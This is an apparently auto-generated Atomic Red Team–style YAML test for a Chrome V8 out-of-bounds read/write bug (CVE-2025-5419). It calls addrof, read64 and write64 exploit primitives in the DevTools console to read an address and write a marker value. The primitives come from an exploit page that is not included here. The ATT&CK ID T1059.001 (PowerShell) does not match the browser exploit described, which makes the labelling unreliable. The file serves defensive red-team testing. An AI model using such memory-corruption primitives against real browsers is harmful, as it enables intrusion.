# Auto-generated by CIPHER v5.0
# Source: caf69c3a92c8
attack_technique: T1059.001
display_name: "T1059.001 - Chrome V8 OOB Read/Write (CVE-2025-5419) - Verify Arbitrary Read/Write"
atomic_tests:
  - name: "T1059.001 - Chrome V8 OOB Read/Write (CVE-2025-5419) - Verify Arbitrary Read/Write"
    description: |
      After loading the exploit page, use the provided JavaScript primitives to read a known address (e.g., Chrome's version string) and write a marker value.
    supported_platforms:
      - windows
    executor:
      name: javascript
      command: |
        /* In Chrome DevTools console */
        let addr = addrof(document.location);
        let version = read64(addr);
        console.log('Chrome version address value:', version);
        write64(addr, 0x4141414141414141n);
        console.log('Marker written');
      cleanup_command: |
        /* Reload page to clear primitives */ location.reload();
